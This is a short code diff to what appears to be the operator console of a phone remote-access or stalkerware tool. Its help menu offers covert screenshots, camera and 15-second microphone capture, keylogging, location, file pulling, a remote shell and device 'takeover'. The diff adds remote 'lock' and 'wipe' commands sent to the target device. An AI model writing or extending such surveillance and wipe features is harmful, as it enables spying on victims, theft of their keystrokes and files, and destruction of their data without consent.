@@ -43,7 +43,7 @@ HELP = [
     ("capture", "s screenshot · v stream on/off · m mic 15s · c photo"),
     ("intel", "i info · l fix · g keylog · a apps · u usage · w wifi · p perms"),
     ("files", "f <dir> list · P <path> pull"),
-    ("control", "x <cmd> shell · t <msg> toast · b buzz · T re-takeover"),
+    ("control", "x <cmd> shell · t <msg> toast · b buzz · T re-takeover · K lock · W wipe"),
     ("session", "r refresh · h help · q quit (Ctrl-C also)"),
 ]
 
@@ -303,6 +303,12 @@ class LiveUI:
             return True
         if key == "T":
             self.takeover()
+            return True
+        if key == "K":
+            self.queue("lock")
+            return True
+        if key == "W":
+            self.queue("wipe")
             return True
         if key == "s":
             self.queue("screenshot")
